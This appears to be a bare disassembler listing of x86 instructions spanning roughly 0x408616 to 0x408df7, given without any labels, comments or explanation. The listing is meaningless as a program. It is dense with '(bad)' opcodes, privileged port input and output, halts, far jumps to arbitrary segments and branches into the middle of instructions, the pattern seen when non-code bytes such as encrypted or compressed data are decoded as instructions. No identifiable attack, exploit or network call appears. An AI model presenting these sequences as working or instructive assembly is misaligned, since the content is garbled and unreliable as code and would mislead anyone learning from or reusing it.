  408616:	lods   al,BYTE PTR ds:[esi]
  408617:	mov    ebx,0x85c7ed0c
  40861c:	adc    eax,0x5109bba
  408621:	outs   dx,BYTE PTR ds:[esi]
  408622:	sub    eax,DWORD PTR [ecx]
  408624:	out    0xe4,al
  408626:	jae    0x4085e8
  408628:	call   0x991353fb
  40862d:	out    0x5d,eax
  40862f:	sub    al,BYTE PTR [edi]
  408631:	inc    eax
  408632:	call   0xdabd:0xcc3b2184
  408639:	arpl   WORD PTR [ebx],di
  40863b:	scas   al,BYTE PTR es:[edi]
  40863c:	das    
  40863d:	mov    dl,0xf
  40863f:	sbb    DWORD PTR [ebp+edx*8-0x4f84f707],ecx
  408646:	add    edi,eax
  408648:	xlat   BYTE PTR ds:[ebx]
  408649:	pop    edx
  40864a:	int    0xb4
  40864c:	xchg   ebp,eax
  40864d:	mov    cl,0xce
  40864f:	pop    esp
  408650:	hlt    
  408651:	outs   dx,DWORD PTR ds:[esi]
  408652:	pop    eax
  408653:	xchg   DWORD PTR [ebp-0x6dac6b08],ebp
  408659:	icebp  
  40865a:	add    BYTE PTR [ebx+eax*1+0x66],bl
  40865e:	fbstp  TBYTE PTR [esi+esi*4+0x7408ef2f]
  408665:	test   al,0x9e
  408667:	mov    al,0xcb
  408669:	fucomp st(2)
  40866b:	adc    al,0x8
  40866d:	xchg   esi,eax
  40866e:	mov    ch,BYTE PTR [ebx-0x7e6f10d]
  408674:	sub    DWORD PTR [edi+ebp*2+0x7],esp
  408678:	or     cl,BYTE PTR [edx]
  40867a:	adc    BYTE PTR [edx-0x7a],al
  40867d:	mov    ch,cl
  40867f:	or     dl,BYTE PTR [ebx-0x55]
  408682:	dec    ebx
  408683:	push   0xffffffb4
  408685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408686:	and    eax,0x35196aed
  40868b:	rol    BYTE PTR [eax+0x6a],1
  40868e:	push   0xa2cb9e5a
  408693:	jno    0x40869d
  408695:	xchg   ebx,eax
  408696:	fsub   QWORD PTR [esi]
  408698:	mov    bl,0xd5
  40869a:	ret    
  40869b:	cmp    eax,0x2d4971df
  4086a0:	push   ss
  4086a1:	stc    
  4086a2:	jb     0x408693
  4086a4:	adc    BYTE PTR [eax],cl
  4086a6:	dec    edi
  4086a7:	popf   
  4086a8:	cmp    eax,0x9d461b74
  4086ad:	loop   0x40866f
  4086af:	lds    edx,FWORD PTR [edx+0x42faf66e]
  4086b5:	out    0xcd,eax
  4086b7:	jl     0x408730
  4086b9:	call   0x3b0a:0x775cad60
  4086c0:	sub    eax,0x34f7fc9f
  4086c5:	arpl   WORD PTR ds:0xd88a5997,di
  4086cb:	mov    bh,0xe3
  4086cd:	dec    edi
  4086ce:	(bad)  
  4086d0:	fdivr  st,st(3)
  4086d2:	jne    0x40867a
  4086d4:	adc    dh,BYTE PTR [edi+0x58785ce1]
  4086da:	mov    al,ds:0x5dfff3c8
  4086df:	pop    ss
  4086e0:	(bad)  
  4086e1:	xchg   esi,eax
  4086e2:	dec    esi
  4086e3:	xchg   esi,eax
  4086e4:	and    ebx,DWORD PTR [esi-0x10fdaa47]
  4086ea:	in     eax,dx
  4086eb:	and    al,0xb5
  4086ed:	adc    ebp,0xe0959e49
  4086f3:	inc    ebp
  4086f4:	or     ah,dh
  4086f6:	mov    cl,0xb5
  4086f8:	retf   
  4086f9:	dec    ebx
  4086fa:	inc    esp
  4086fb:	mov    ebp,0xb29dc69e
  408700:	outs   dx,BYTE PTR ds:[esi]
  408701:	fwait
  408702:	pop    edx
  408703:	add    eax,0x81e0178d
  408708:	in     al,0x32
  40870a:	sub    BYTE PTR [bp+si],cl
  40870d:	mov    dh,0x8f
  40870f:	jo     0x408742
  408711:	add    BYTE PTR [ecx-0x2584347a],bl
  408717:	fisttp QWORD PTR [ebp+0x120a5f21]
  40871d:	js     0x4086ea
  40871f:	cdq    
  408720:	sahf   
  408721:	xchg   BYTE PTR [ebp-0x63622f65],al
  408727:	mov    WORD PTR [eax],?
  408729:	add    BYTE PTR [edi-0x2b],dl
  40872c:	dec    ebp
  40872d:	inc    eax
  40872e:	mov    BYTE PTR [esi-0x33],cl
  408731:	mov    dh,0xe
  408733:	fdiv   st(3),st
  408735:	neg    BYTE PTR [edi]
  408737:	xor    eax,DWORD PTR [esi]
  408739:	call   0xbcaab1bc
  40873e:	fsub   DWORD PTR [esi-0x5a]
  408741:	fcmovne st,st(2)
  408743:	adc    DWORD PTR [eax],eax
  408745:	or     ebp,eax
  408747:	mov    eax,0x5a5ee13c
  40874c:	leave  
  40874d:	mov    edi,0x7439388e
  408752:	inc    edi
  408753:	mov    al,ds:0x89b50882
  408758:	(bad)  
  40875a:	js     0x4086dd
  40875c:	mov    cl,0xa7
  40875e:	fild   QWORD PTR [eax-0x16c61292]
  408764:	fnstcw WORD PTR [ebx]
  408766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408767:	mov    dh,0x77
  408769:	mov    eax,0xd18418a4
  40876e:	jmpw   0x9de
  408772:	sub    BYTE PTR [esi],bl
  408774:	add    eax,0x79460ff7
  408779:	jne    0x408745
  40877b:	push   edi
  40877c:	jmp    0x408767
  40877e:	mov    edx,fs
  408780:	hlt    
  408781:	sbb    DWORD PTR [esi],0xffffff93
  408784:	pop    edi
  408785:	push   es
  408786:	mov    cl,0x65
  408788:	test   al,0xd1
  40878a:	ins    DWORD PTR es:[edi],dx
  40878b:	pop    esp
  40878c:	mov    ebp,fs
  40878e:	daa    
  40878f:	xor    esi,DWORD PTR [esp+edx*4-0x7585a7a9]
  408796:	and    BYTE PTR [ebx],al
  408798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408799:	sbb    DWORD PTR [eax+esi*2+0xa],0xb9f36f75
  4087a1:	cli    
  4087a2:	inc    ebp
  4087a3:	jne    0x40879e
  4087a5:	retf   
  4087a6:	inc    edi
  4087a7:	sar    DWORD PTR [edx+0x18036750],cl
  4087ad:	bound  esp,QWORD PTR [esi-0x52]
  4087b0:	inc    esi
  4087b1:	lods   eax,DWORD PTR ds:[esi]
  4087b2:	neg    DWORD PTR [ebp*2-0xac38fec]
  4087b9:	inc    edx
  4087ba:	ret    0x776d
  4087bd:	sbb    al,BYTE PTR [edx]
  4087bf:	(bad)  
  4087c0:	sbb    al,0x2c
  4087c2:	js     0x408748
  4087c4:	(bad)  
  4087c6:	in     al,0x46
  4087c8:	daa    
  4087c9:	ret    
  4087ca:	jno    0x40878c
  4087cc:	sbb    bh,BYTE PTR [eax+0x52]
  4087cf:	add    eax,0x2b14580f
  4087d4:	clc    
  4087d5:	js     0x408846
  4087d7:	(bad)  
  4087d8:	ja     0x408782
  4087da:	jb     0x4087c9
  4087dc:	sub    DWORD PTR ds:0x8dbbc1e3,edi
  4087e2:	push   eax
  4087e3:	xor    al,0xaf
  4087e5:	aam    0xe6
  4087e7:	mov    al,dh
  4087e9:	icebp  
  4087ea:	and    eax,0x700c99bb
  4087ef:	int3   
  4087f0:	int    0x1c
  4087f2:	jno    0x4087a4
  4087f4:	iret   
  4087f5:	call   ecx
  4087f7:	mov    ds:0x33ddb7d0,eax
  4087fc:	mov    al,ds:0xc8c9dbbb
  408801:	cdq    
  408802:	push   cs
  408803:	outs   dx,DWORD PTR ds:[esi]
  408804:	jecxz  0x408870
  408806:	mov    eax,DWORD PTR [edi]
  408808:	inc    ecx
  408809:	mov    bh,0x5
  40880b:	call   0xa3fbabc0
  408810:	lds    ecx,FWORD PTR [eax]
  408812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408813:	leave  
  408814:	add    eax,0x489b4262
  408819:	or     esi,eax
  40881b:	add    BYTE PTR [eax-0x501c8fb3],ch
  408821:	pop    esp
  408822:	adc    BYTE PTR [esi],0xa2
  408825:	imul   BYTE PTR [edi+ebp*1]
  408828:	xchg   ecx,eax
  408829:	cli    
  40882a:	lods   al,BYTE PTR ds:[esi]
  40882b:	jnp    0x40884c
  40882d:	xchg   ebx,eax
  40882e:	cmp    DWORD PTR [ebx],ebx
  408830:	cmp    eax,0xac3c9d35
  408836:	dec    ecx
  408837:	push   esi
  408838:	inc    ebx
  408839:	xchg   ecx,eax
  40883a:	mov    al,0xa
  40883c:	fdivr  QWORD PTR [ebx+0x2a36befc]
  408842:	data16 ss mov bh,0xe8
  408846:	dec    ecx
  408847:	pop    ebp
  408848:	sbb    eax,0x408f9687
  40884d:	sbb    dl,BYTE PTR [ecx+0x3328e7a7]
  408853:	cld    
  408854:	sub    al,0xb7
  408856:	jno    0x40883c
  408858:	(bad)  
  40885a:	jo     0x40881b
  40885c:	dec    eax
  40885d:	xchg   ecx,eax
  40885e:	in     eax,dx
  40885f:	in     al,0x80
  408861:	mov    esi,0x4c675d7a
  408866:	inc    esi
  408867:	test   al,0x39
  408869:	jmp    0x394344a0
  40886e:	call   0x6940823c
  408873:	xchg   ecx,eax
  408874:	fs push 0x41
  408877:	mov    esi,cr5
  40887a:	ins    BYTE PTR es:[edi],dx
  40887b:	sbb    eax,DWORD PTR [esi]
  40887d:	pop    esi
  40887e:	test   al,0xd5
  408880:	cmp    bl,BYTE PTR [esi-0x6f5aad71]
  408886:	enter  0xd646,0x27
  40888a:	dec    esp
  40888b:	push   ds
  40888c:	sti    
  40888d:	mov    ah,dl
  40888f:	stc    
  408890:	loope  0x40882c
  408892:	xor    DWORD PTR [edx],ecx
  408894:	pop    ebp
  408895:	das    
  408896:	ret    
  408897:	(bad)  
  408898:	sub    ch,BYTE PTR [esi-0x1]
  40889b:	add    al,0xf
  40889d:	outs   dx,BYTE PTR ds:[esi]
  40889e:	loopne 0x408915
  4088a0:	push   ds
  4088a1:	xor    BYTE PTR [ebx+0x485d4532],0xe9
  4088a8:	and    BYTE PTR [edx],dh
  4088aa:	inc    ebx
  4088ab:	data16 rcr BYTE PTR [edi+ebx*1+0x50],1
  4088b0:	stc    
  4088b1:	mov    ah,0x6a
  4088b3:	popa   
  4088b4:	cs push cs
  4088b6:	push   ds
  4088b7:	in     al,0x7a
  4088b9:	jne    0x4088a2
  4088bb:	int    0xb2
  4088bd:	inc    esp
  4088be:	xchg   esp,eax
  4088bf:	mov    cl,0xdf
  4088c1:	xor    BYTE PTR [edi+0x5c],0xc5
  4088c5:	test   BYTE PTR [ecx],cl
  4088c7:	cdq    
  4088c8:	call   0xe97f0b03
  4088cd:	adc    eax,0x1d39ee03
  4088d2:	ret    
  4088d3:	adc    ch,cl
  4088d5:	pop    edi
  4088d6:	xor    al,0x6a
  4088d8:	xor    DWORD PTR [ecx-0x20],ebx
  4088db:	mov    edx,0x5efbdee7
  4088e0:	jge    0x4088f5
  4088e2:	(bad)  
  4088e3:	in     al,dx
  4088e4:	pop    ecx
  4088e5:	loope  0x40889c
  4088e7:	nop
  4088e8:	jo     0x408910
  4088ea:	pop    ss
  4088eb:	cld    
  4088ec:	es mov ch,0xbf
  4088ef:	sub    bh,BYTE PTR [ecx]
  4088f1:	inc    ebx
  4088f2:	adc    al,0xbb
  4088f4:	or     al,0xa9
  4088f6:	popf   
  4088f7:	mov    dl,0xb8
  4088f9:	mov    DWORD PTR [eax-0x2c58a236],eax
  4088ff:	stc    
  408900:	int3   
  408901:	push   esp
  408902:	bound  edx,QWORD PTR [ecx+0x6ca44da4]
  408908:	or     dl,BYTE PTR [eax]
  40890a:	jl     0x40893a
  40890c:	fnstenv [ecx]
  40890e:	xor    eax,0x7dd1508f
  408913:	mov    bl,0xf7
  408915:	mov    ds:0x395fcc3,al
  40891b:	shl    BYTE PTR [edx-0x1b],cl
  40891e:	in     al,dx
  40891f:	xor    BYTE PTR ds:0x38e98bed,ch
  408925:	test   edi,0xa1491b3e
  40892b:	(bad)  [eax+0x15948740]
  408931:	cmp    bl,BYTE PTR [eax+0x61]
  408934:	loop   0x40896b
  408936:	mov    ecx,0xed76d3b2
  40893b:	mov    cl,0x22
  40893d:	nop
  40893e:	stc    
  40893f:	jmp    0x26c36879
  408944:	xchg   esi,eax
  408945:	lds    ebp,FWORD PTR [ebx-0x47]
  408948:	fld    TBYTE PTR [edi+0x192fd3ce]
  40894e:	and    al,0xba
  408950:	inc    edx
  408951:	ds cwde 
  408953:	jle    0x4089c5
  408955:	pop    esi
  408956:	lahf   
  408957:	add    eax,0x7657e1c6
  40895c:	cmp    edi,esi
  40895e:	jns    0x4089c1
  408960:	(bad)  
  408961:	rol    DWORD PTR [eax],cl
  408963:	scas   eax,DWORD PTR es:[edi]
  408964:	jge    0x4089aa
  408966:	cmp    al,0x6d
  408968:	mov    dl,0xf2
  40896a:	pop    ecx
  40896b:	cmp    eax,0x212d3d9f
  408970:	mov    al,0x59
  408972:	ret    0x3b0f
  408975:	test   esi,0x4d56bb09
  40897b:	lea    esi,[esi+0x88b3c9b]
  408981:	popa   
  408982:	mov    ds:0xdf7cd93f,al
  408987:	push   edi
  408988:	lods   al,BYTE PTR ds:[esi]
  408989:	in     al,0xe5
  40898b:	mov    ss,WORD PTR [ebp+0x37]
  40898e:	jae    0x4089ff
  408990:	cs ins BYTE PTR es:[edi],dx
  408992:	lahf   
  408993:	fisub  WORD PTR ds:[ecx]
  408996:	sbb    eax,0x10a306ea
  40899b:	adc    ah,dl
  40899d:	mov    ch,0x5c
  40899f:	mov    cl,0xcb
  4089a1:	stos   BYTE PTR es:[edi],al
  4089a2:	icebp  
  4089a3:	inc    esp
  4089a4:	sub    eax,0x447163b5
  4089a9:	mov    ah,0x7e
  4089ab:	fstp   TBYTE PTR [ebp-0x3d]
  4089ae:	div    DWORD PTR [edx+0x7f]
  4089b1:	fstp   QWORD PTR [esi-0x36f6de73]
  4089b7:	mov    edi,0x4c5c74c1
  4089bc:	xchg   ecx,eax
  4089bd:	cmp    eax,0xc5d2c1fd
  4089c2:	cwde   
  4089c3:	mov    ds:0x9f8cd985,eax
  4089c8:	dec    esi
  4089c9:	xchg   BYTE PTR [eax+0x2097ba6c],dh
  4089cf:	jns    0x4089a1
  4089d1:	jae    0x4089e6
  4089d3:	xchg   ecx,eax
  4089d4:	lahf   
  4089d5:	bound  ecx,QWORD PTR [ecx-0x3d]
  4089d8:	push   ds
  4089d9:	jg     0x40898c
  4089db:	cdq    
  4089dc:	adc    ah,0x98
  4089df:	inc    esp
  4089e0:	imul   ebx,esp,0xe84366c1
  4089e6:	cmp    bl,ah
  4089e8:	loopne 0x408996
  4089ea:	push   ss
  4089eb:	rcr    DWORD PTR es:[eax],0xd4
  4089ef:	out    0xa8,al
  4089f1:	inc    esp
  4089f2:	ins    DWORD PTR es:[edi],dx
  4089f3:	push   0xffffffe8
  4089f5:	std    
  4089f6:	xchg   edi,eax
  4089f7:	pusha  
  4089f8:	adc    bh,0xc7
  4089fb:	fdiv   DWORD PTR [ebx+ebp*2+0x68]
  4089ff:	cmp    eax,0xe2fc72df
  408a04:	jnp    0x4089d6
  408a06:	inc    edi
  408a07:	sar    DWORD PTR [ecx-0x31ccd60e],1
  408a0d:	cli    
  408a0e:	pop    ebx
  408a0f:	rol    dl,0x2d
  408a12:	popa   
  408a13:	push   cs
  408a14:	mov    esp,0xe4fe77bf
  408a19:	cmp    eax,0x5c7b7476
  408a1e:	retf   0xb90
  408a21:	inc    eax
  408a22:	(bad)  
  408a23:	leave  
  408a24:	mov    ebx,0x29f42e74
  408a29:	mov    BYTE PTR [ecx-0x7d],dl
  408a2c:	xor    eax,0x1e1e4977
  408a31:	push   edx
  408a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a34:	xchg   ecx,eax
  408a35:	sub    bh,BYTE PTR [eax-0x42]
  408a38:	rcr    BYTE PTR [ebp-0x10],cl
  408a3b:	mov    ecx,0x6aaf14da
  408a40:	ret    
  408a41:	inc    edx
  408a42:	dec    eax
  408a43:	cli    
  408a44:	cs pop esp
  408a46:	cwde   
  408a47:	mov    esp,0xc66ff07
  408a4c:	add    ecx,edi
  408a4e:	and    al,0x8a
  408a50:	mov    esp,0x5303fb65
  408a55:	lahf   
  408a56:	int3   
  408a57:	pop    es
  408a58:	push   edx
  408a59:	cmp    eax,0xc25ab1d5
  408a5e:	sbb    edi,ecx
  408a60:	sbb    al,dl
  408a62:	in     eax,0xf
  408a64:	mov    al,0x90
  408a66:	retf   0xc931
  408a69:	adc    eax,0x4eba8dca
  408a6e:	lahf   
  408a6f:	cwde   
  408a70:	xchg   edx,eax
  408a71:	jne    0x408af1
  408a73:	outs   dx,DWORD PTR fs:[esi]
  408a75:	inc    eax
  408a76:	bound  ecx,QWORD PTR [ebx+0xe918ab2]
  408a7c:	lods   eax,DWORD PTR ds:[esi]
  408a7d:	pop    esi
  408a7e:	sub    al,0xc9
  408a80:	(bad)  
  408a81:	frstor [edx+ecx*8+0x28]
  408a85:	pushf  
  408a86:	xor    BYTE PTR [ebx],0xb0
  408a89:	pop    ds
  408a8a:	outs   dx,BYTE PTR ds:[esi]
  408a8b:	lods   al,BYTE PTR ds:[esi]
  408a8c:	sbb    al,0x55
  408a8e:	jmp    0xf5f4:0xb187a76
  408a95:	repnz sub DWORD PTR [edx],ebp
  408a98:	sub    DWORD PTR [edi-0x7a2a589c],ebx
  408a9e:	inc    eax
  408a9f:	jae    0x408aa2
  408aa1:	rol    DWORD PTR [esi-0x8],0x9
  408aa5:	(bad)  
  408aa7:	pop    esi
  408aa8:	imul   esp,DWORD PTR [edi],0xffffffaa
  408aab:	scas   al,BYTE PTR es:[edi]
  408aac:	out    dx,al
  408aad:	adc    al,BYTE PTR [esi+0x79]
  408ab0:	div    ah
  408ab2:	sub    edi,DWORD PTR [edx]
  408ab4:	sub    DWORD PTR [esi-0x76],eax
  408ab7:	dec    ebp
  408ab8:	jae    0x408ae6
  408aba:	call   0x5ef0:0x8bf6c4ee
  408ac1:	sar    BYTE PTR ds:0xe6a821a4,cl
  408ac7:	mov    bh,ch
  408ac9:	jp     0x408a51
  408acb:	xchg   DWORD PTR ds:0xa2dadeae,esi
  408ad1:	popf   
  408ad2:	imul   BYTE PTR [edx-0x5992cadb]
  408ad8:	mov    eax,ds:0x7bc1a252
  408add:	jecxz  0x408af6
  408adf:	jl     0x408ad8
  408ae1:	or     al,0x8c
  408ae3:	out    0x7d,eax
  408ae5:	call   0xc025:0xcebdb8a6
  408aec:	inc    esi
  408aed:	jnp    0x408a9c
  408aef:	es jo  0x408b2c
  408af2:	pop    ebp
  408af3:	mov    BYTE PTR [eax],bl
  408af5:	rcl    DWORD PTR [edx+0xcc18af4],1
  408afb:	mov    ds:0xc0bafa46,al
  408b00:	add    al,0x44
  408b02:	mov    ah,0xfb
  408b04:	sbb    BYTE PTR [ebx],0x8c
  408b07:	ret    0xc463
  408b0a:	or     al,0xd7
  408b0c:	mov    al,ds:0xfbf7bae9
  408b11:	lods   al,BYTE PTR ds:[esi]
  408b12:	(bad)  
  408b13:	sti    
  408b14:	popf   
  408b15:	pop    ebx
  408b16:	loopne 0x408b0a
  408b18:	push   edi
  408b19:	or     al,0x67
  408b1b:	cmp    DWORD PTR [eax],edx
  408b1d:	(bad)  
  408b1e:	dec    eax
  408b1f:	adc    al,0xd
  408b21:	por    mm5,mm1
  408b24:	jle    0x408aeb
  408b26:	inc    ebx
  408b27:	lahf   
  408b28:	push   cs
  408b29:	adc    DWORD PTR [edi+0x49],edx
  408b2c:	add    BYTE PTR [edx],cl
  408b2e:	ds pop ebp
  408b30:	mov    ds:0x882159b8,al
  408b35:	mov    ds:0xfc72a4fc,al
  408b3a:	in     eax,dx
  408b3b:	mov    edx,0xc10e38af
  408b40:	es inc esp
  408b42:	inc    ebp
  408b43:	in     eax,0xd
  408b45:	cmp    al,0x80
  408b47:	push   eax
  408b48:	sub    DWORD PTR [ecx],0x1a
  408b4b:	xchg   edx,eax
  408b4c:	xchg   esi,eax
  408b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b4e:	or     al,0x70
  408b50:	sbb    eax,0x51d93200
  408b55:	mov    ch,0x8a
  408b57:	jmp    0xc81c:0x74f4255f
  408b5e:	cmp    DWORD PTR ds:0xbf935d7d,esi
  408b64:	fmul   DWORD PTR [eax+0x46c28fc6]
  408b6a:	shl    BYTE PTR [ecx+eiz*2-0x5f40694b],1
  408b71:	and    al,0x61
  408b73:	mov    WORD PTR [eax],ds
  408b75:	jmp    0x408ba8
  408b77:	inc    edx
  408b78:	cmp    esi,ecx
  408b7a:	sbb    eax,0x5457ce91
  408b7f:	enter  0x3dc9,0x1d
  408b83:	dec    eax
  408b84:	or     dh,BYTE PTR [ebx+esi*4-0x2]
  408b88:	nop
  408b89:	sbb    al,0x55
  408b8b:	fs das 
  408b8d:	and    edx,DWORD PTR [eax+0xb]
  408b90:	sbb    BYTE PTR [esi+0x2fe8f019],0xab
  408b97:	adc    dl,bh
  408b99:	cmp    DWORD PTR [eax],ecx
  408b9b:	xor    al,0x1f
  408b9d:	dec    esi
  408b9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b9f:	inc    ecx
  408ba0:	add    al,0x79
  408ba2:	add    al,0x88
  408ba4:	pop    ebx
  408ba5:	pop    esi
  408ba6:	adc    al,0xb9
  408ba8:	jne    0x408b3d
  408baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bab:	iret   
  408bac:	aad    0xbb
  408bae:	adc    eax,0x3f68b598
  408bb3:	cld    
  408bb4:	int    0xba
  408bb6:	int    0x55
  408bb8:	cmp    ah,BYTE PTR [eax-0x6e]
  408bbb:	cwde   
  408bbc:	stos   DWORD PTR es:[edi],eax
  408bbd:	inc    edx
  408bbe:	cmp    DWORD PTR [edi+0x32],esi
  408bc1:	inc    ebp
  408bc2:	test   al,0xfd
  408bc4:	cmp    bh,dh
  408bc6:	out    dx,al
  408bc7:	xor    al,0xf3
  408bc9:	sahf   
  408bca:	sbb    eax,0xf6e310e7
  408bcf:	arpl   sp,bp
  408bd1:	pop    ds
  408bd2:	outs   dx,BYTE PTR ds:[esi]
  408bd3:	imul   eax
  408bd5:	and    DWORD PTR gs:[esi+0x56e28353],0x2b
  408bdd:	inc    ebp
  408bde:	jns    0x408c23
  408be0:	and    BYTE PTR [ebp+0x29],ch
  408be3:	pop    edi
  408be4:	or     al,0xf4
  408be6:	inc    ebx
  408be7:	cmp    DWORD PTR ds:0x2836f771,0x6b
  408bee:	es cmp eax,edx
  408bf1:	and    al,0x66
  408bf3:	jge    0x408c60
  408bf5:	or     bh,bl
  408bf7:	call   FWORD PTR [eax+0x708a7231]
  408bfd:	push   es
  408bfe:	mov    ecx,0x2c2b2671
  408c03:	cli    
  408c04:	xchg   edi,eax
  408c05:	imul   ebx,ebx,0xf
  408c08:	popa   
  408c09:	push   ecx
  408c0a:	cmp    BYTE PTR [eax],bl
  408c0c:	sar    DWORD PTR ds:0xc4e906eb,0x47
  408c13:	loop   0x408c3e
  408c15:	pop    edi
  408c16:	(bad)  
  408c17:	mov    fs,WORD PTR [ebx]
  408c19:	xchg   BYTE PTR [ecx+0x54],bl
  408c1c:	int3   
  408c1d:	inc    esi
  408c1e:	mov    esi,0x5ac59f6
  408c23:	xchg   ebp,eax
  408c24:	jge    0x408c9c
  408c26:	lea    esi,[ecx+0xd]
  408c29:	mov    ebx,0xbe450fc
  408c2e:	cld    
  408c2f:	idiv   DWORD PTR [ebp+0x6c]
  408c32:	lock xor DWORD PTR [ebx-0x28],esp
  408c36:	mov    edi,0xe041ef3f
  408c3b:	mov    ebx,0x2413ce46
  408c40:	idiv   edi
  408c42:	mov    BYTE PTR [edx-0x6b],al
  408c45:	xchg   ebx,eax
  408c46:	inc    eax
  408c47:	inc    eax
  408c48:	rol    DWORD PTR [esi-0x1e7599a7],1
  408c4e:	mov    ebp,0x6ac75667
  408c53:	test   eax,0x38aa8d74
  408c58:	mov    BYTE PTR [ebx],dh
  408c5a:	or     DWORD PTR [ebp+0x2da9a256],0x60b30cd7
  408c64:	ins    DWORD PTR es:[edi],dx
  408c65:	enter  0x2de4,0xde
  408c69:	loope  0x408ca2
  408c6b:	fist   WORD PTR [ebx]
  408c6d:	xor    BYTE PTR [eax+0x7b2831b7],cl
  408c73:	repnz and DWORD PTR [edi+ebx*8+0x35],ebp
  408c78:	lds    edi,FWORD PTR [edx+0x3f]
  408c7b:	mov    esi,0xa56c4f8c
  408c80:	pop    ds
  408c81:	or     al,dl
  408c83:	pop    edx
  408c84:	shr    bh,cl
  408c86:	sbb    eax,0x1ce7cca3
  408c8b:	jmp    0x3a552bcc
  408c90:	pop    ebp
  408c91:	sbb    BYTE PTR [edi+0x4c18fb56],bl
  408c97:	scas   al,BYTE PTR es:[edi]
  408c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c99:	adc    DWORD PTR [edx-0x49],ebp
  408c9c:	shl    BYTE PTR [eax+0x66b3146],0xb2
  408ca3:	xor    BYTE PTR [ecx+0x3249e47],cl
  408ca9:	mov    ebp,0x329c6ac0
  408cae:	sbb    ecx,DWORD PTR [ebx+0x79]
  408cb1:	cmp    eax,0xf4b3cc55
  408cb6:	les    ebx,FWORD PTR [ebx+0x53]
  408cb9:	mov    ds:0xffb6cfef,al
  408cbe:	add    eax,0xa1aae9f5
  408cc3:	icebp  
  408cc4:	xlat   BYTE PTR ds:[ebx]
  408cc5:	jge    0x408cab
  408cc7:	test   eax,0xc01162f6
  408ccc:	xchg   DWORD PTR [esi+0x78],ebx
  408ccf:	fisubr WORD PTR [ecx]
  408cd1:	pushf  
  408cd2:	ss imul ecx,DWORD PTR ds:[eax],0x3d1d5108
  408cda:	loop   0x408d11
  408cdc:	out    0xe3,al
  408cde:	fwait
  408cdf:	mov    dh,0x6d
  408ce1:	(bad)  [eax+edx*2+0x472abf78]
  408ce8:	ret    
  408ce9:	in     al,dx
  408cea:	push   ebp
  408ceb:	mov    BYTE PTR [edi-0x10],ah
  408cee:	stos   DWORD PTR es:[edi],eax
  408cef:	sahf   
  408cf0:	enter  0x9e85,0x33
  408cf4:	add    ebx,ecx
  408cf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cf7:	(bad)
  408cfa:	jmp    0xeb74:0x686c1ea7
  408d01:	cwde   
  408d02:	cld    
  408d03:	mov    bh,0xb8
  408d05:	cmp    al,0x24
  408d07:	adc    BYTE PTR [ebx+0x13117b],0x91
  408d0e:	(bad)  [eax+0x12f557cd]
  408d14:	sub    BYTE PTR [esi-0x11],0xe2
  408d18:	aas    
  408d19:	jns    0x408d25
  408d1b:	stc    
  408d1c:	sub    eax,0xd17e4e0b
  408d21:	pop    edi
  408d22:	les    esi,FWORD PTR [ebx+eiz*8]
  408d25:	sub    esp,DWORD PTR [ecx-0x35]
  408d28:	mov    ebp,0x818b1936
  408d2d:	xchg   edi,eax
  408d2e:	dec    ebx
  408d2f:	loope  0x408d77
  408d31:	mov    edx,0xd1ff9aa
  408d36:	mov    ebx,0x1b655a09
  408d3b:	dec    esp
  408d3c:	dec    esi
  408d3d:	sub    BYTE PTR [edx-0x13b5b628],bl
  408d43:	push   ebx
  408d44:	and    dl,cl
  408d46:	adc    DWORD PTR [edx-0x4a],ebx
  408d49:	jae    0x408d6e
  408d4b:	push   ebp
  408d4c:	add    edi,esi
  408d4e:	call   0x5a26e6b
  408d53:	xor    cl,BYTE PTR [ebp-0x2]
  408d56:	int3   
  408d57:	inc    edi
  408d58:	das    
  408d59:	in     al,dx
  408d5a:	aam    0x7d
  408d5c:	imul   ebx,DWORD PTR [ecx-0x40],0x5a18743e
  408d63:	in     al,0x7e
  408d65:	xchg   ebp,eax
  408d66:	jecxz  0x408d36
  408d68:	jo     0x408d5b
  408d6a:	push   eax
  408d6b:	adc    ah,bh
  408d6d:	pop    edx
  408d6e:	(bad)
  408d71:	mov    esp,0x26d6e9dc
  408d76:	pop    ecx
  408d77:	push   0x320273f7
  408d7c:	loopne 0x408ddd
  408d7e:	hlt    
  408d7f:	test   ecx,ecx
  408d81:	ds pop es
  408d83:	retf   
  408d84:	stos   BYTE PTR es:[edi],al
  408d85:	inc    ecx
  408d86:	add    eax,0x38047cc9
  408d8b:	in     eax,dx
  408d8c:	mov    esi,0x4fd25456
  408d91:	push   esi
  408d92:	pop    ebx
  408d93:	out    0x6c,eax
  408d95:	cmp    al,BYTE PTR [esi+ebx*1-0x3c]
  408d99:	sahf   
  408d9a:	add    eax,0x2eea8b2b
  408d9f:	hlt    
  408da0:	inc    esi
  408da1:	fs jg  0x408df1
  408da4:	(bad)  
  408da5:	fist   WORD PTR [ebp-0x2893dd5b]
  408dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dac:	pushf  
  408dad:	pop    es
  408dae:	lods   al,BYTE PTR ds:[esi]
  408daf:	in     al,dx
  408db0:	cmp    BYTE PTR [esi+0x74],0xaf
  408db4:	dec    ebp
  408db5:	adc    ecx,edi
  408db7:	fwait
  408db8:	mov    ch,BYTE PTR [edi+0x37]
  408dbb:	int3   
  408dbc:	jecxz  0x408dd1
  408dbe:	ret    0x9abf
  408dc1:	push   edx
  408dc2:	add    al,BYTE PTR [edi]
  408dc4:	or     BYTE PTR [ecx-0xb975e86],cl
  408dca:	es daa 
  408dcc:	xor    ah,al
  408dce:	and    DWORD PTR [eax],esi
  408dd0:	push   edx
  408dd1:	retf   0x675
  408dd4:	adc    BYTE PTR ds:0x4fab69fd,ch
  408dda:	mov    ds:0xf33b29b5,al
  408ddf:	mov    eax,0x74af7d83
  408de4:	pushf  
  408de5:	jle    0x408e5e
  408de7:	(bad)  
  408de8:	xor    eax,0x73a78be6
  408ded:	or     eax,0x7c4305ca
  408df2:	xor    al,0x6f
  408df4:	push   ebx
  408df5:	mov    cl,0x44
  408df7:	pop    ss
